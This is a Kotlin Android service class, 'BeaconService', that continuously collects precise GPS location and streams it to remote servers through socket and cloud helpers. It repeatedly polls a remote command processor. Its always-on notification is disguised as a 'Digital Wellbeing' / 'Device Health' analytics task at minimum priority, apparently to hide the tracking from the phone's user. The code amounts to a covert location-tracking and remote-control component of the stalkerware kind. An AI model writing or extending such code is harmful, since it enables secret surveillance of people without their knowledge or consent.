package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.Priority
import kotlinx.coroutines.*
import org.json.JSONObject

class BeaconService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var intervalSeconds = 60L
    
    private var locationCallback: LocationCallback? = null
    private var fusedClient: com.google.android.gms.location.FusedLocationProviderClient? = null
    private var latestLocation: android.location.Location? = null
    private var activeMode: String = "BURST"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val durationMins = intent?.getLongExtra("duration_mins", 5L) ?: 5L
        activeMode = intent?.getStringExtra("mode") ?: "BURST"
        val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)
        
        intervalSeconds = when(activeMode) {
            "LIVE_STREAM" -> 3L // 3-second updates for smooth line
            "LOCATION_STREAM" -> 15L
            else -> 5L
        }

        try {
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                startForeground(9999, createNotification(), 1073741824) // FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            } else {
                startForeground(9999, createNotification())
            }
        } catch (e: Exception) {
            DebugLogger.log("BEACON_ERR", "startForeground failed: ${e.message}")
        }
        
        DebugLogger.log("BEACON", "Mode: $activeMode | Duration: ${durationMins}m")
        fusedClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this)

        // Setup Smooth Hardware Location Callback
        if (activeMode == "LIVE_STREAM" || activeMode == "LOCATION_STREAM") {
            if (activeMode == "LIVE_STREAM") SocketManager.connect(applicationContext)

            if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                try {
                    val locRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, intervalSeconds * 1000)
                        .setMinUpdateIntervalMillis((intervalSeconds * 1000) / 2)
                        .build()

                    locationCallback = object : LocationCallback() {
                        override fun onLocationResult(locationResult: LocationResult) {
                            for (loc in locationResult.locations) {
                                latestLocation = loc
                                if (activeMode == "LIVE_STREAM") {
                                    SocketManager.streamLocation(loc.latitude, loc.longitude, loc.accuracy)
                                }
                            }
                        }
                    }

                    fusedClient?.requestLocationUpdates(locRequest, locationCallback!!, Looper.getMainLooper())
                    DebugLogger.log("BEACON", "Hardware LocationCallback attached successfully. Continuous tracking active.")
                } catch (e: Exception) {
                    DebugLogger.log("BEACON_ERR", "Failed to attach hardware callback: ${e.message}")
                }
            } else {
                DebugLogger.log("BEACON_ERR", "Location tracking denied: Missing ACCESS_FINE_LOCATION permission.")
            }
        }
        
        scope.launch {
            while (isActive) {
                if (System.currentTimeMillis() > endTime) {
                    stopSelf()
                    break
                }

                if (activeMode != "LIVE_STREAM") {
                    val extra = JSONObject()
                    if (activeMode == "LOCATION_STREAM" && latestLocation != null) {
                        val locObj = JSONObject().apply {
                            put("lat", latestLocation!!.latitude)
                            put("lon", latestLocation!!.longitude)
                            put("acc", latestLocation!!.accuracy)
                        }
                        extra.put("stream_location", locObj)
                    }
                    CloudManager.sendPing(applicationContext, "$activeMode (${(endTime - System.currentTimeMillis())/60000}m left)", extra)
                }
                
                CommandProcessor.checkAndExecute(applicationContext)
                delay(intervalSeconds * 1000)
            }
        }

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "Device Health", NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Digital Wellbeing")
            .setContentText("Running background analytics")
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        try {
            locationCallback?.let { fusedClient?.removeLocationUpdates(it) }
        } catch (e: Exception) {}
        if (activeMode == "LIVE_STREAM") SocketManager.disconnect()
        DebugLogger.log("BEACON", "Service Stopped and LocationCallback detached.")
    }
}
